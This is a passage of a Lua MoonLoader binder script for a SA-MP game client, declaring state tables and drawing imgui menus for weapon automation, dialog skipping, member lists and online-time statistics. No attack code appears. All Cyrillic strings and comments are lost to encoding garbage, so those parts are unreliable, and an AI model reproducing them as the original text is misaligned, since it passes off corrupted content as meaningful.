	[1010] = "���� ��", [1011] = "���� ��", [1012] = "���� ��", [1013] = "���� ��", [1014] = "���� ��",
	[1015] = "���� ��", [1016] = "���� ��",

	[1017] = "������ �-12", [1018] = "������ �-12", [1019] = "������ �-12", [1020] = "������ �-12", [1021] = "������ �-12",
	[1022] = "������ �-12", [1023] = "������ �-12", [1024] = "������ �-12"
}

local carsident = {}
local sanc = {[226] = "Sanchez", [227] = "Sanchez", [228] = "Sanchez", [231] = "Sanchez", [230] = "Sanchez", [229] = "Sanchez"}
local rCache = {enable = false, squaddata = {}, smem = {}}
-- Pie Menu
local piearr = {
		action = 0,
		pie_mode = imgui.ImBool(false),
		pie_keyid = 0,
		pie_elements = {},
		
		["weap"] = {
			action = 0,
			pie_mode = imgui.ImBool(false),
			pie_keyid = 0,
			pie_elements = {},
		}
}
local fond = {[1] = "ERROR", [2] = "0"}
-- ���������� ��
local isarmtaken = false
local isdeagletaken = false
local isshotguntaken = false
local issmgtaken = false
local ism4a1taken = false
local isrifletaken = false
local ispartaken = false
local whatwastaken = {}
local AutoDeagle = config_ini.bools[18] == 1 and true or false
local AutoShotgun = config_ini.bools[19] == 1 and true or false
local AutoSMG = config_ini.bools[20] == 1 and true or false
local AutoM4A1 = config_ini.bools[21] == 1 and true or false
local AutoRifle = config_ini.bools[22] == 1 and true or false
local AutoPar = config_ini.bools[23] == 1 and true or false
local AutoOt = config_ini.bools[24] == 1 and true or false
local partimer = 0
local armtimer = 0
local istakesomeone = false -- ����� ���� �� ���� ���-�� �����
-- ������� ������� ��������
local needtohold = false
-- �������������� ������ ������ � ��������������
local otWeaponName = {
		{[23] = "����������� �������� \"SD Pistol\"", [24] = "�������� \"Desert Eagle\"", [25] = "�������� \"Shotgun\"", [29] = "��������-������� \"HK MP-5\"", [31] = "��������� �������� \"M4A1\"", [30] = "��������� �������� \"AK-47\"", [33] = "����������� �������� \"Country Rifle\""},
		{[25] = "��������� \"Shotgun\"", [29] = "���������-�������� \"HK MP-5\"", [31] = "��������� �������� \"M4A1\"", [30] = "��������� �������� \"AK-47\"", [33] = "����������� �������� \"Country Rifle\""}
}
local autopred = {["firstshot"] = false, ["current_weapon"] = 0}
local crosMode2 = false
-- �������
local isDialogActiveNow = false -- ����� ������� �� � ������ ������ ������
local IsAppear = false -- ����� ������ �� ������ �������
local DialogTitle = ""
local DialogText = ""
local DialogButton1 = ""
local DialogButton2 = ""
local isCorrectClose = false -- ����� ��������� �� ��� ������ ������
local SelectedButton = 0 -- ����� ������ (1 ��� 2) ���� ������
local returnWalue = nil
-- List
local show_dialog_list = imgui.ImBool(false)
local ChoosenRow = -1
local SelectedRow = 0
local StrCol = 0
-- Input
local show_dialog_input = imgui.ImBool(false)
local IsFocused = false -- ����� ��� �� ��������� ����� �� �����
local moonimgui_text_buffer = imgui.ImBuffer(256)
-- msgbox
local show_dialog_msgbox = imgui.ImBool(false)
-- ����������� ����������
local lastKV = {m = "none", b = "none"}
local lastID = {e = "none"}
local RKTimerTickCount
local BKTimerTickCount
local CTaskArr = {
	[1] = {}, -- ID �������
	-- 1 - ���, 2 - ���������, 3 - ������ 7 �� ��� ����� � ���� (�������� ��������� �� ������� � �������); 4 - ������� � ���� ���; 5 - ���� �������� ���������� �� ��, 6 - �������� ��������, 8 - /repairkit, 9 - ���� �������� 10 - ������� �������, 11 - ������ ��������, 12 - ������ �� ������
	[2] = {}, -- ����� ������ �������
	[3] = {}, -- ���. ���������� ��� �������
	["CurrentID"] = 0, 
	["n"] = {
		[1] = "{FF0000}SOS", 
		[2] = "{00FF00}���������", 
		[3] = "{59a655}������ ������� 7",
		[4] = "{00FF00}������������� ���",
		[5] = "{00FF00}����" .. RP .. " ��������",
		[6] = "{00FF00}������" .. RP .. " �������� � �����",
		[7] = "{00FF00}������������ �� ������",
		[8] = "{FF0000}���. ��������",
		[9] = "{00FF00}����" .. RP .. " ��������",
		[10] = "{00FF00}������� �������",
		[11] = "{00FF00}������" .. RP .. " ��������",
		[12] = "{FF0000}������",
	}, -- ����� �������� � �� �� ID �������
	["nn"] = {1, 2, 4, 7, 10, 12}, -- ID's ������� ������� ����������� ��� ���������� (�� ������� �3) � ������� ��
	[10] = { -- ������ �������� ��� ������ �� (������� ����������)
		[1]	= "", -- ������� ���������� ����� �� SOS (��� ID �10)
		[2] = {[1] = {[1] = 0, [2] = 0, [3] = 0}, [2] = false}, -- ������ ��� �� �5 (1 - ������ � ������� {1 - ������� ������, 2 - ��������� ������, 3 - �� ���������� � �������}, 2 - ���������� �� �� � ���������)
		[3] = 0, -- ������� �� ��������� ������ ������� (ID 7)
		[4] = false, -- ��� �� ������� ���� �� ������ (�� �10)
		[5] = false, -- ���� �� �������� ������� �� id 8 �� ������ ������
		[6] = false, -- id 9 - ����� ���������� �� �� � ���������,
		[7] = false, -- ���� �� �������� ������� �� id 12 �� ������ ������
	}
}
local imCStatus = "{FFFAFA}�������� �������"
-- ��������� �����
local lastrand = 0
-- ������
local isth = false
local issquadactive = {[1] = false, [2] = false, [3] = 0}
local isglory = false
local PICKUP_POOL
local isSending = false
local skipd = {
	[1] = { -- ���������� � ��������� �������� ������
		["pid"] = -1, 
		["obool"] = true
	}, 
	
	[2] = { -- id's ����� ���������� � �������
		[1] = 0, -- ���������� �� print �����
		[2] = 0, -- 1 ���� �������
		[3] = 0, -- 2 ���� �������
		[4] = 0, -- 3 ���� �������
		[5] = 0, -- �� (������)
		[6] = 0, -- �� (����� � �������)
		[7] = 0, -- ���� � ��
		[8] = 0, -- ����� �� ��
		[9] = 0, 
		[10] = 0, 
		[11] = 0, 
		[12] = 0,
		[13] = 0, 
		[14] = 0, 
		[15] = 0, 
		[16] = 0, 
		[17] = 0, 
		[18] = 0,
		[19] = 0, 
		[20] = 0, 
		[21] = 0, 
		[22] = 0, 
		[23] = 0, 
		[24] = 0,
		[25] = 0, 
		[26] = 0, 
		[27] = 0, 
		[28] = 0, 
		[29] = 0, 
		[30] = 0,

	}, 
		
	[3] = { -- ���. ����������
		[1] = false, -- ���� �� ������� ������ (��� ��������������� ����� ����������� �������)
		[2] = 0, -- ������ ����������� � 24/7 (0 - �� ����������/������� �����, 1 - ������� �����, 2 - ������� ������/������� �� �����, 3 - ������ ��� �������)
		[3] = false, -- ��� �� ����� �� /carm (��� �������� ���������� �������)
		[4] = 0, -- ���������� ���������� � ���������
		[5] = false, -- ��� �� ������ /carm ���� �����������
		[6] = { -- ���������� �������
			["LSPD"] = 0, 
			["SFPD"] = 0,
			["LVPD"] = 0, 
			["FBI"] = 0, 
			["SFA"] = 0
		},
		[7] = {[1] = false, [2] = 0}, -- ���������� �� ����� � ��� (��� ����� �������������� �������� �� ���); 2 - �� 3� ������ ��������
		[8] = { -- ������ ��� ��������������� /carm
			[1] = false, -- ��� �� ������ /carm �������� (���� ������� �� ����� ���)
			[2] = false, -- ������ �� �������� � ������� �������������� ���������
			[3] = {[1] = {["x1"] = 322, ["y1"] = 1918, ["x2"] = 344, ["y2"] = 1979}, [2] = {["x1"] = 2211, ["y1"] = 2444, ["x2"] = 2250, ["y2"] = 2506}, [3] = {["x1"] = 1515, ["y1"] = -1667, ["x2"] = 1535, ["y2"] = -1586}, [4] = {["x1"] = -1722, ["y1"] = 672, ["x2"] = -1696, ["y2"] = 723}, [5] = {["x1"] = -1491, ["y1"] = 325, ["x2"] = -1543, ["y2"] = 386}, [6] = {["x1"] = -2467, ["y1"] = 457, ["x2"] = -2389, ["y2"] = 528}},
			-- 1 LVA 2 LVPD 3 LSPD 4 SFPD 5 SFA 6 FBI
			-- ���������� �������� �������������� ���������
			[4] = {}, -- ��������� ������
		},
	}
}

local lastTargetID = -1
local lastcarhandle = nil
local spsyns = {
	["car"] = nil, -- ����� ������� ������
	["mode"] = false, -- ����� �������������
	["changespeed"] = false, -- ����� �� �������� �������� � ���������� ������
	["tarspeed"] = 0, -- ������� ��������
	["firstshow"] = false, -- ���� �� ������������� �������� ������ ���
	["fcoord"] = {}, -- ������ ����������
	["scoord"] = {}, -- ������ ����������
	["time"] = 0, -- ����� ������ ���������� �������
}

local waitforsave = false
local lastcolorchane = false -- ���� �� ��������� ����� ���� � ������ ������ (��� ����� �� �������������� ����� �����)
local soptlist = {{}, {}}
local otmmode = false
local onlinearr = {}
local preparecomplete = false
local isobnova = false
local freereq = true
local req_index = 0
local memb_ini = inicfg.load({players = {}}, "members")
local refmem1 = {["status"] = false, ["text"] = ""}
local moderpas = ""
local afkstatus = false
local needtosave = false
local needtosyns = false
local keybbb = {KeyboardLayoutName = ffi.new("char[?]", 32), LocalInfo = ffi.new("char[?]", 32)}
local needtoreset = false
local delay = 1000 -- �������� ����� ����������� � ��
local style = imgui.GetStyle()
local colors = style.Colors
local clr = imgui.Col
local ImVec4 = imgui.ImVec4
local imfonts = {mainfont = nil, exFontl = nil, exFont = nil, exFontsquad = nil, font500 = nil, fontmoney = nil, exFontsquadrender = nil, onlinebig = nil, onlinesmal = nil}
local clists = {
	[16777215] = 0,    [2852758528] = 1,  [2857893711] = 2,  [2857434774] = 3,  [2855182459] = 4, [2863589376] = 5, 
	[2854722334] = 6,  [2858002005] = 7,  [2868839942] = 8,  [2868810859] = 9,  [2868137984] = 10, 
	[2864613889] = 11, [2863857664] = 12, [2862896983] = 13, [2868880928] = 14, [2868784214] = 15, 
	[2868878774] = 16, [2853375487] = 17, [2853039615] = 18, [2853411820] = 19, [2855313575] = 20, 
	[2853260657] = 21, [2861962751] = 22, [2865042943] = 23, [2860620717] = 24, [2868895268] = 25, 
	[2868899466] = 26, [2868167680] = 27, [2868164608] = 28, [2864298240] = 29, [2863640495] = 30, 
	[2864232118] = 31, [2855811128] = 32, [2866272215] = 33,
}

local ranksnames = {[1] = "�������", [2] = "��������", [3] = "��.�������", [4] = "�������", [5] = "��.�������", [6] = "��������", [7] = "���������", [8] = "��.���������", [9] = "���������", [10] = "��.���������", [11] = "�������", [12] = "�����", [13] = "������������", [14] = "���������", [15] = "�������"}
local duel = {
	["mode"] = false, 

	["en"] = {
		["id"] = -1, 
		["hp"] = 0, 
		["arm"] = 0
	}, 
	
	["fightmode"] = false, 
	
	["my"] = {
		["hp"] = 0, 
		["arm"] = 0
	}
}

local stroyarr = {
	stroymode = false,
	soptlist = {["ruk"] = {}, ["osn"] = {}, ["stj"] = {}},
	stroypr = {
		["ids"] = {}, 
		["zv"] = {}, 
		["index"] = {
			["ruk"] = {["first"] = 0, ["last"] = 0}, 
			["osn"] = {["first"] = 0, ["last"] = 0}, 
			["stj"] = {["first"] = 0, ["last"] = 0}
		}
	},
	
	stroystate = 0,
	stroyleader = {["current"] = "", ["temp"] = ""},
	stroycreator = false,
	creator = {["id"] = 0, ["zv"] = 0},
	listcomplete = false,
	listfinal = false
}
--- ������� �������
local startTime = 0
local connectingTime = 0
local time_index = 0
local tWeekdays = {
    [0] = '�����������',
    [1] = '�����������', 
    [2] = '�������', 
    [3] = '�����', 
    [4] = '�������', 
    [5] = '�������', 
    [6] = '�������'
}

local wfuls = config_ini.week_info.full
local dfuls = config_ini.day_info.full
local ses = {["online"] = 0, ["afk"] = 0, ["full"] = 0}

function apply_custom_styles()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

	imgui.GetIO().Fonts:Clear()
	imfonts.mainfont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 14.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.memfont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 20.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFontl = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 20.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFont = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 28.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	imfonts.exFontsquad = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\trebuc.ttf', squadsize, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) --trebuchet
	imfonts.font500 = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 54, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 
	imfonts.onlinebig = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 32, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 
	imfonts.onlinesmal = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 14, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 
	imfonts.exFontsquadrender = renderCreateFont("times", 11, 12)
	--imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\stencil.ttf', 48, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())   
	--imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(ttf1_data, 48, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 

	-- File: 'STENCIL.ttf' (55596 bytes)
	-- Exported using binary_to_compressed_lua.cpp
		imfonts.fontmoney = imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(imgs.result_compressed_data_base85, 24, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic()) 

		-- ����� ������� ��������� ����� ��� ������ ���������:
	        imgui.GetIO().Fonts:AddFontFromFileTTF(getFolderPath(0x14)..'\\times.ttf', 14.0, nil, imgui.GetIO().Fonts:GetGlyphRangesCyrillic())
	        imgui.RebuildFonts()
	 
end
apply_custom_styles()

function imgui.OnDrawFrame()
	-- ############################ Pie Menu
			if piearr.pie_mode.v then
					imgui.OpenPopup('PieMenu')
					if pie.BeginPiePopup('PieMenu', piearr.pie_keyid) then
							for k, v in ipairs(piearr.pie_elements) do
									if v.next == nil then if pie.PieMenuItem(u8(v.name)) then v.action() end
									elseif type(v.next) == 'table' then drawPieSub(v) end
							end
							pie.EndPiePopup()
					end
			end

			if piearr.weap.pie_mode.v then
				imgui.OpenPopup('PieMenu2')
				if pie.BeginPiePopup('PieMenu2', piearr.weap.pie_keyid) then
						for k, v in ipairs(piearr.weap.pie_elements) do
								if v.next == nil then if pie.PieMenuItem(v.name) then v.action() end
								elseif type(v.next) == 'table' then drawPieSub(v) end
						end
						pie.EndPiePopup()
				end
			end
			
			-- if piearr.reportpie.pie_mode.v then
					-- imgui.OpenPopup('PieMenu')
					-- if pie.BeginPiePopup('PieMenu', piearr.reportpie.pie_keyid) then
							-- for k, v in ipairs(piearr.reportpie.pie_elements[piearr.reportpie.mode]) do
									-- if v.next == nil then if pie.PieMenuItem(u8(v.name)) then v.action() end
									-- elseif type(v.next) == 'table' then drawPieSub(v) end
							-- end
							-- pie.EndPiePopup()
					-- end
			-- end

		if show.show_mem1.v then
			imgui.SwitchContext()
			colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
			imgui.PushFont(imfonts.memfont)
			local sw, sh = getScreenResolution()
			imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
			imgui.SetNextWindowSize(imgui.ImVec2(650, 540), imgui.Cond.Always)
			imgui.Begin(u8("������ ������"), show.show_mem1, 2 + 32)
				imgui.Columns(5, 1, true)
				imgui.TextColoredRGB("{FFFAFA}#")
				for k, v in ipairs(mem1[1]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}ID")
				for k, v in ipairs(mem1[2]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}���")
				for k, v in ipairs(mem1[3]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") if imgui.IsItemClicked() then show.show_mem1.v = false sampSetChatInputEnabled(true) sampSetChatInputText("/t " .. mem1[2][k] .. " ") end end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}����")
				for k, v in ipairs(mem1[4]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.NextColumn()
				imgui.TextColoredRGB("{FFFAFA}���")
				for k, v in ipairs(mem1[5]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end
				imgui.SetColumnWidth(0, 40)
				imgui.SetColumnWidth(1, 40)
				imgui.SetColumnWidth(2, 200)
				imgui.SetColumnWidth(3, 150)
				imgui.LockPlayer = true
				imgui.ShowCursor = true
			imgui.End()
			imgui.PopFont()
		end

		if show.show_otm.v then
			imgui.SwitchContext()
			colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
			imgui.PushFont(imfonts.memfont)
			local sw, sh = getScreenResolution()
			imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
			imgui.SetNextWindowSize(imgui.ImVec2(600, 580), imgui.Cond.Always)
			imgui.Begin(u8("������� ������"), show.show_otm, 2 + 32)

			imgui.PushFont(imfonts.onlinebig) imgui.TextColoredRGB('{FFFF00}�������� �� ��� ������: ' .. get_clock(ses.full) .. '') imgui.PopFont()
			imgui.PushFont(imfonts.onlinesmal) imgui.CenterTextColoredRGB('{fffafa}�� ��� ������ ������: ' .. get_clock(ses.online) .. ' / AFK: ' ..  get_clock(ses.afk) .. '') imgui.PopFont()
			imgui.PushFont(imfonts.onlinebig) imgui.TextColoredRGB('{0087FF}����� �������� �� ���� ������: ' .. get_clock(config_ini.week_info.full) .. '') imgui.PopFont()
			imgui.PushFont(imfonts.onlinesmal) imgui.CenterTextColoredRGB('{fffafa}�� ��� ������ ������: ' .. get_clock(config_ini.week_info.online) .. ' / AFK: ' ..  get_clock(config_ini.week_info.afk) .. '') imgui.PopFont()
			imgui.NewLine()
			local ct = tonumber(os.date('%w', os.time()))
			imgui.TextColoredRGB("������ �� ���� ������:")
            for day = 1, 6 do -- �� -> ��
				local ctag = day == ct and "{008000}" or ""
                imgui.TextColoredRGB("" .. ctag .. "" .. tWeekdays[day] .. ""); imgui.SameLine(250)
                imgui.TextColoredRGB("" .. ctag .. "" .. get_clock(config_ini.online[day]) .. "")
            end 
            --> ��
            imgui.TextColoredRGB("" .. (ct == 0 and "{008000}" or "") .. "" .. tWeekdays[0] .. ""); imgui.SameLine(250)
            imgui.TextColoredRGB("" .. (ct == 0 and "{008000}" or "") .. "" .. get_clock(config_ini.online[0]) .. "")

			imgui.NewLine()
			local arr = {{}, {}}
			for k, vv in ipairs (show.otm_arr) do
				table.insert(arr[1], vv.name)
				table.insert(arr[2], vv.v)
			end

			imgui.Columns(2, 1, true)
			imgui.TextColoredRGB("{FFFAFA}���")
			local f, s = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))):match("(.*)%_(.*)")
			local ss = "" .. f .. " " .. s .. ""
			for k, v in ipairs(arr[1]) do imgui.TextColoredRGB("{" .. (ss == v and "008000" or "fffafa") .. "}" .. v .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}�������")
			for k, v in ipairs(arr[2]) do imgui.TextColoredRGB("{FFFAFA}" .. v .. "") end

			imgui.SetColumnWidth(0, 200)
			imgui.SetColumnWidth(1, 80)
			imgui.End()
			imgui.PopFont()
			imgui.LockPlayer = true
			imgui.ShowCursor = true
		end

		if show.show_lek.v then
			imgui.SwitchContext()
			colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
			imgui.PushFont(imfonts.memfont)
			local sw, sh = getScreenResolution()
			imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
			imgui.SetNextWindowSize(imgui.ImVec2(650, 540), imgui.Cond.Always)
			imgui.Begin(u8("������� � ����������� ������ ���������"), show.show_lek, 2 + 32)
			local arr = {{}, {}, {}, {}, {}, {}, {}}
			for k, v in pairs(show.lek_arr) do
				table.insert(arr[1], k) 
				table.insert(arr[2], v[1]) 
				table.insert(arr[3], v[2]) 
				table.insert(arr[4], v[3]) 
				table.insert(arr[5], v[4]) 
				table.insert(arr[6], v[5]) 
				table.insert(arr[7], v[6])
			end

			imgui.Columns(7, 1, true)
			imgui.TextColoredRGB("{FFFAFA}���")
			for k, v in ipairs(arr[1]) do local a, b = v:match("(.*) (.*)") local id = sampGetPlayerIdByNickname("" .. a .. "_" .. b .. "") imgui.TextColoredRGB("{FFFAFA}" .. v .. "" .. (id ~= nil and "[" .. id .. "]" or "") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}���")
			for k, v in ipairs(arr[2]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}��")
			for k, v in ipairs(arr[3]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}��")
			for k, v in ipairs(arr[4]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}��")
			for k, v in ipairs(arr[5]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}���")
			for k, v in ipairs(arr[6]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end

			imgui.NextColumn()
			imgui.TextColoredRGB("{FFFAFA}��")
			for k, v in ipairs(arr[7]) do imgui.TextColoredRGB("{FFFAFA}" .. (v == 1 and "{008000}+" or "{FF0000}-") .. "") end
			
			imgui.SetColumnWidth(0, 170)
			imgui.SetColumnWidth(1, 80)
			imgui.SetColumnWidth(2, 80)
			imgui.SetColumnWidth(3, 80)
			imgui.SetColumnWidth(4, 80)
			imgui.SetColumnWidth(5, 80)
			imgui.SetColumnWidth(6, 80)
			imgui.End()
			imgui.PopFont()
			imgui.LockPlayer = true
			imgui.ShowCursor = true
		end

		if guis.mainw.v then -- �������� ����
				imgui.SwitchContext()
				colors[clr.WindowBg] = ImVec4(0.06, 0.06, 0.06, 0.94)
				imgui.PushFont(imfonts.mainfont)
				imgui.LockPlayer = true
				sampSetChatDisplayMode(0)
				local sw, sh = getScreenResolution()
				imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
				imgui.SetNextWindowSize(imgui.ImVec2(1200, 730), imgui.Cond.Always)
				imgui.Begin("Binder for CO by Belka version " .. tostring(V) .. "", guis.mainw, 4 + 2 + 32)
				imgui.Text(u8("��� ����������� � �������� ����� c������� � ����� �����. ���� ���� ������� ������� �� ������ \"������\", ����� ��������� ������������ ������� �� ������ \"���������\". �������� ����!"))
				local ww = imgui.GetWindowWidth()
				local wh = imgui.GetWindowHeight()
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 320))
						if imgui.Button(u8("���������"), imgui.ImVec2(120.0, 20.0)) then guis.mainw.v = false imgui.ShowCursor = false imgui.LockPlayer = false sampSetChatDisplayMode(3) sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ����������...", 0xFFFF0000) needtosave = true needtosyns = true end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 290))
						if imgui.Button(u8("����� ����������"), imgui.ImVec2(120.0, 20.0)) then imgui.ShowCursor, imgui.LockPlayer = false, false sampSetChatDisplayMode(3) sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}���������� ����� ��������...", 0xFFFF0000) needtoreset = true guis.mainw.v = false end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 260))
						if imgui.Button(u8("�������� / ������"), imgui.ImVec2(120.0, 20.0)) then guis.updatestatus.status.v = true end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 510, wh/2 - 320))
						if imgui.Button(u8("�������� �����"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v = true, false, false, false, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 380, wh/2 - 320))
						if imgui.Button(u8("���������������� ������"), imgui.ImVec2(160.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v  = false, true, false, false, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 210, wh/2 - 320))
						if imgui.Button(u8("�������������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v  = false, false, true, false, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 - 80, wh/2 - 320))
						if imgui.Button(u8("�������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v  = false, false, false, true, false, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 50, wh/2 - 320))
						if imgui.Button(u8("Overlay"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v  = false, false, false, false, true, false, false, false, false, false, false, false, false, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 180, wh/2 - 320))
						if imgui.Button(u8("������� ��������"), imgui.ImVec2(160.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v  = false, false, false, false, false, false, false, false, false, false, false, false, true, false	end
				imgui.SetCursorPos(imgui.ImVec2(ww/2 + 350, wh/2 - 320))
						if imgui.Button(u8("���������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.status, maintabs.tab_user_binds.status, maintabs.tab_bbot.status, maintabs.tab_commands.status,	maintabs.tab_overlay.status, maintabs.tab_settings.status, maintabs.user_keys.status.v, maintabs.rphr.status.v, maintabs.auto_bp.status.v, maintabs.tab_commands.help.v, maintabs.warnings.status.v, guis.updatestatus.status.v, maintabs.tab_skipd.status.v, maintabs.tab_weap.status.v = false, false, false, false, false, true, false, false, false, false, false, false, false, false end

				if maintabs.tab_skipd.status.v then
					if imgui.ToggleButton("tab_skipd1", togglebools.tab_skipd[1]) then config_ini.bools[45] = togglebools.tab_skipd[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ � �������"))
					if imgui.ToggleButton("tab_skipd2", togglebools.tab_skipd[2]) then config_ini.bools[46] = togglebools.tab_skipd[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������������� �� ���������� ������ �� �� �������"))
					if imgui.ToggleButton("tab_skipd3", togglebools.tab_skipd[3]) then config_ini.bools[47] = togglebools.tab_skipd[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ �������� �� ������/���������� �������� ���"))
					if imgui.ToggleButton("tab_skipd4", togglebools.tab_skipd[4]) then config_ini.bools[48] = togglebools.tab_skipd[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� �������� ������ ����� � /carm (���������� ��������� �������� /mon)"))
